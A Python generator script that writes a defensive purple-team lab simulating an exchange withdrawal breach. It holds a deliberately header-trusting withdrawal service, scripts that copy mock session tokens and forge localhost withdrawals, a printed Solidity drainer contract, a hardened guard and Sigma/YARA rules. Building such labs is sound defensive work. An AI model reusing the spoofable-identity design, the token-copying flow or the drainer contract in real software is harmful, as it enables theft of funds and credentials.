from pathlib import Path

FILES = {}

FILES["ETHICS.md"] = '''# ⚠️ ETHICS & LEGAL NOTICE

This repository is a **defensive security research lab**. It exists to help
blue teams understand and mitigate the class of attacks described in public
reporting on the October 2026 Binance incident.

## Rules of Use
1. Authorized use only — run this only on systems you own or have written
   permission to test.
2. Fake data only — every wallet, token, and balance here is a placeholder.
3. Isolated network — services bind to 127.0.0.1 or Docker's internal bridge.
4. No weaponization — do not use any of this against real infrastructure.
5. Responsible disclosure — report real findings privately.

By using this repo you agree to these terms.
'''

FILES["README.md"] = '''# exchange-breach-sim

A safe, purple-team simulation lab modeling the internal trust-chain failure
behind the October 2026 Binance-style withdrawal breach.

> ⚠️ Read [ETHICS.md](ETHICS.md) before running anything.

## Attack-chain model

DevOps laptop --stolen session--> withdrawal-service --mTLS--> HSM mock
                                                      ^
                                                      | forged request
                                                      | auto-signs
                                                      v
                                                on-chain sweep

## Phases
| Phase | Folder | Purpose |
|---|---|---|
| 1. Session hijack | attacker/simulate_laptop_compromise.sh | Copy mocked session tokens |
| 2. Forged withdrawal | attacker/forge_withdrawal_request.py | Bypass gateway via internal mTLS |
| 3. HSM auto-sign | exchange/hsm-mock/ | Show implicit-trust failure |
| 4. On-chain sweep | attacker/sweep_eip7702_demo.py | EIP-7702 delegation concept |
| Defense | defense/layered-withdrawal-guard/ | Hardened version |
| Detection | defense/detection-rules/ | Sigma + YARA |

## Quick start (Docker host, not Termux)
    cp .env.example .env
    docker compose up -d --build
    bash attacker/simulate_laptop_compromise.sh
    python3 attacker/forge_withdrawal_request.py

## License
MIT — see [LICENSE](LICENSE).
'''

FILES[".gitignore"] = '''.env
__pycache__/
*.pyc
.venv/
lab/attacker-loot/
telemetry/otel.log
'''

FILES[".env.example"] = '''HSM_URL=http://hsm-mock:8082
SECOND_APPROVER=compliance-service
OTEL_EXPORTER_OTLP_ENDPOINT=
'''

FILES["Makefile"] = '''.PHONY: up down logs attack defend clean

up:
	docker compose up -d --build

down:
	docker compose down -v

logs:
	docker compose logs -f

attack:
	bash attacker/simulate_laptop_compromise.sh
	python3 attacker/forge_withdrawal_request.py

defend:
	curl -s -X POST http://127.0.0.1:8091/internal/withdraw \\
	  -H "Content-Type: application/json" \\
	  -H "X-Service-Identity: withdrawal-service" \\
	  -d "{\\"amount\\":\\"6.36\\",\\"asset\\":\\"BTC\\",\\"to\\":\\"bc1qdemo\\",\\"user_id\\":\\"alice\\"}"

clean:
	docker compose down -v
'''

FILES["docker-compose.yml"] = '''services:
  withdrawal-service:
    build: ./exchange/withdrawal-service
    ports: ["127.0.0.1:8081:8081"]
    environment:
      - HSM_URL=http://hsm-mock:8082
    depends_on: [hsm-mock]

  hsm-mock:
    build: ./exchange/hsm-mock
    ports: ["127.0.0.1:8082:8082"]
    environment:
      - ALLOWED_SERVICE_CERT=withdrawal-service

  ledger-db:
    image: postgres:16-alpine
    environment:
      - POSTGRES_USER=ledger
      - POSTGRES_PASSWORD=ledger
      - POSTGRES_DB=ledger
    volumes:
      - ./exchange/ledger-db/init.sql:/docker-entrypoint-initdb.d/init.sql:ro
    ports: ["127.0.0.1:5432:5432"]

  frontend:
    image: nginx:alpine
    volumes:
      - ./exchange/frontend/index.html:/usr/share/nginx/html/index.html:ro
    ports: ["127.0.0.1:8080:80"]
'''

FILES["exchange/withdrawal-service/app.py"] = '''from flask import Flask, request, jsonify
import os, requests, logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(message)s")
HSM_URL = os.getenv("HSM_URL", "http://hsm-mock:8082")

@app.route("/internal/withdraw", methods=["POST"])
def internal_withdraw():
    svc = request.headers.get("X-Service-Identity", "unknown")
    body = request.get_json() or {}
    logging.info(f"withdraw request svc={svc} body={body}")
    r = requests.post(f"{HSM_URL}/sign", json=body,
                      headers={"X-Service-Identity": svc}, timeout=5)
    return jsonify(r.json()), r.status_code

@app.route("/healthz")
def healthz():
    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8081)
'''

FILES["exchange/withdrawal-service/Dockerfile"] = '''FROM python:3.12-slim
WORKDIR /app
RUN pip install --no-cache-dir flask requests
COPY app.py .
EXPOSE 8081
CMD ["python", "app.py"]
'''

FILES["exchange/hsm-mock/app.py"] = '''from flask import Flask, request, jsonify
import os, logging, hashlib

app = Flask(__name__)
logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(message)s")
ALLOWED = os.getenv("ALLOWED_SERVICE_CERT", "withdrawal-service")

@app.route("/sign", methods=["POST"])
def sign():
    svc = request.headers.get("X-Service-Identity", "")
    if svc != ALLOWED:
        return jsonify({"error": "unauthorized service"}), 403
    body = request.get_json() or {}
    fake_sig = hashlib.sha256(f"{body}".encode()).hexdigest()
    logging.info(f"HSM SIGNED amount={body.get('amount')} to={body.get('to')} sig={fake_sig}")
    return jsonify({"signed": True, "signature": fake_sig, "amount": body.get("amount")})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8082)
'''

FILES["exchange/hsm-mock/Dockerfile"] = '''FROM python:3.12-slim
WORKDIR /app
RUN pip install --no-cache-dir flask
COPY app.py .
EXPOSE 8082
CMD ["python", "app.py"]
'''

FILES["exchange/ledger-db/init.sql"] = '''CREATE TABLE balances (
  id SERIAL PRIMARY KEY,
  user_id TEXT NOT NULL,
  asset TEXT NOT NULL,
  amount NUMERIC(20,8) NOT NULL DEFAULT 0
);

INSERT INTO balances (user_id, asset, amount) VALUES
  ('alice', 'BTC',   1.0),
  ('alice', 'ETH',   10.0),
  ('bob',   'USDT',  50000);
'''

FILES["exchange/frontend/index.html"] = '''<!doctype html>
<html><head><title>exchange-breach-sim</title></head>
<body>
  <h1>exchange-breach-sim</h1>
  <p>Read-only demo view. No real funds, no real keys.</p>
  <pre id="out"></pre>
  <script>
    document.getElementById("out").textContent = [
      "withdrawal-service  127.0.0.1:8081",
      "hsm-mock            127.0.0.1:8082",
      "ledger-db           127.0.0.1:5432"
    ].join("\\n");
  </script>
</body></html>
'''

FILES["attacker/simulate_laptop_compromise.sh"] = '''#!/data/data/com.termux/files/usr/bin/bash
set -euo pipefail
SRC="${HOME}/exchange-breach-sim/lab/mock-laptop"
DST="${HOME}/exchange-breach-sim/lab/attacker-loot"
mkdir -p "$DST"
echo "[*] T-36h: infected laptop pulls cached session material"
for f in kubeconfig sts-token ssh-agent.sock service-cert.pem; do
  if [ -f "$SRC/$f" ]; then
    cp "$SRC/$f" "$DST/$f"
    echo "    [+] exfiltrated $f"
  fi
done
echo "[*] Loot stored at $DST (harmless mock files)"
'''

FILES["attacker/forge_withdrawal_request.py"] = '''#!/usr/bin/env python3
"""Forge a withdrawal from a compromised internal service container."""
import argparse, json, urllib.request

def post(url, body, headers):
    req = urllib.request.Request(
        url, data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json", **headers},
        method="POST")
    with urllib.request.urlopen(req, timeout=5) as r:
        return r.status, r.read().decode()

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://127.0.0.1:8081/internal/withdraw")
    p.add_argument("--amount", default="6.36")
    p.add_argument("--asset",  default="BTC")
    p.add_argument("--to",     default="bc1qattacker-demo-address")
    a = p.parse_args()
    body = {"amount": a.amount, "asset": a.asset, "to": a.to, "user_id": "alice"}
    headers = {"X-Service-Identity": "withdrawal-service"}
    print(f"[*] Forging withdrawal: {body}")
    status, resp = post(a.target, body, headers)
    print(f"[+] HTTP {status}: {resp}")

if __name__ == "__main__":
    main()
'''

FILES["attacker/sweep_eip7702_demo.py"] = '''#!/usr/bin/env python3
"""EIP-7702 sweep concept demo (educational only)."""

DRAINER_SOL = "// SPDX-License-Identifier: MIT\\n" \\
    "pragma solidity ^0.8.24;\\n" \\
    "contract Sweeper {\\n" \\
    "    address payable constant ATTACKER =\\n" \\
    "        payable(0x000000000000000000000000000000000000dEaD);\\n" \\
    "    receive()  external payable { ATTACKER.transfer(address(this).balance); }\\n" \\
    "    fallback() external payable { ATTACKER.transfer(address(this).balance); }\\n" \\
    "}"

DELEGATION_NOTE = (
    "EIP-7702 delegation: EOA --authorization--> Sweeper\\n"
    "Subsequent transfer(EOA) => Sweeper.receive() sweeps balance.\\n"
)

def main():
    print(DELEGATION_NOTE)
    print(DRAINER_SOL)
    print("[!] CONCEPT ONLY. Do not deploy.")
    print("[*] Detection rule: defense/detection-rules/yara_eip7702.yar")

if __name__ == "__main__":
    main()
'''

FILES["defense/layered-withdrawal-guard/app.py"] = '''from flask import Flask, request, jsonify
import os, time, logging
from collections import defaultdict

app = Flask(__name__)
logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(message)s")

_recent = defaultdict(list)
LARGE_THRESHOLD = 1.0
WINDOW          = 60
MAX_PER_WINDOW  = 2
SECOND_APPROVER = os.getenv("SECOND_APPROVER", "compliance-service")
TIMELOCK        = 5

@app.route("/internal/withdraw", methods=["POST"])
def withdraw():
    svc      = request.headers.get("X-Service-Identity", "")
    approver = request.headers.get("X-Second-Approval", "")
    body     = request.get_json() or {}
    amount   = float(body.get("amount", 0))
    now      = time.time()

    _recent[svc] = [t for t in _recent[svc] if now - t < WINDOW]
    if len(_recent[svc]) >= MAX_PER_WINDOW:
        logging.warning(f"velocity block svc={svc}")
        return jsonify({"error": "velocity limit"}), 429
    _recent[svc].append(now)

    if amount >= LARGE_THRESHOLD and approver != SECOND_APPROVER:
        logging.warning(f"missing 2nd approval svc={svc} amount={amount}")
        return jsonify({"error": "second approval required"}), 403

    logging.info(f"timelock {TIMELOCK}s svc={svc} amount={amount}")
    time.sleep(min(TIMELOCK, 1))
    return jsonify({"queued": True, "amount": amount, "timelock": TIMELOCK})

@app.route("/healthz")
def healthz():
    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8091)
'''

FILES["defense/layered-withdrawal-guard/Dockerfile"] = '''FROM python:3.12-slim
WORKDIR /app
RUN pip install --no-cache-dir flask
COPY app.py .
EXPOSE 8091
CMD ["python", "app.py"]
'''

FILES["defense/detection-rules/sigma_forged_withdrawal.yml"] = '''title: Forged Internal Withdrawal via Service Identity Reuse
id: 5f1c2e9a-0000-4000-8000-exchange-breachsim
status: experimental
description: Detects forged internal withdrawals carrying a trusted service identity
author: exchange-breach-sim
logsource:
  product: generic
  service: withdrawal-service
detection:
  selection_identity:
    X-Service-Identity: "withdrawal-service"
  selection_no_gateway:
    gateway_auth_present: false
  condition: selection_identity and selection_no_gateway
falsepositives:
  - Legitimate batch reconciliation jobs
level: high
tags:
  - attack.t1550
  - attack.t1567
'''

FILES["defense/detection-rules/yara_eip7702.yar"] = '''rule EIP7702_Sweeper_Bytecode
{
    meta:
        description = "Heuristic match for EIP-7702 sweeper contracts"
        author      = "exchange-breach-sim"
    strings:
        $a = "Sweeper" ascii nocase
    condition:
        uint32(0) == 0x3078 and $a
}
'''

FILES["telemetry/README.md"] = '''# Telemetry

All lab services log to stdout.

    docker compose logs -f withdrawal-service hsm-mock

To ship to a real backend, set OTEL_EXPORTER_OTLP_ENDPOINT in .env.
'''

FILES["lab/mock-laptop/kubeconfig"] = '''# MOCK only.
apiVersion: v1
kind: Config
clusters:
- cluster: {server: "https://mock.local"}
  name: mock
'''

FILES["lab/mock-laptop/sts-token"] = "MOCK-STS-TOKEN-DO-NOT-USE\n"
FILES["lab/mock-laptop/ssh-agent.sock"] = "MOCK-SOCKET-FILE\n"
FILES["lab/mock-laptop/service-cert.pem"] = (
    "-----BEGIN MOCK CERT-----\n"
    "THIS IS NOT A REAL CERTIFICATE\n"
    "-----END MOCK CERT-----\n"
)

FILES["run-local.sh"] = '''#!/data/data/com.termux/files/usr/bin/bash
set -e
pip install --quiet flask requests
export HSM_URL=http://127.0.0.1:8082
python3 exchange/hsm-mock/app.py                > /tmp/hsm.log  2>&1 &
python3 exchange/withdrawal-service/app.py      > /tmp/ws.log   2>&1 &
python3 defense/layered-withdrawal-guard/app.py > /tmp/guard.log 2>&1 &
echo "[*] hsm-mock    http://127.0.0.1:8082"
echo "[*] withdrawal  http://127.0.0.1:8081"
echo "[*] guard       http://127.0.0.1:8091"
wait
'''

def main():
    for path, content in FILES.items():
        p = Path(path)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
        print(f"wrote {path}  ({len(content)} bytes)")

if __name__ == "__main__":
    main()
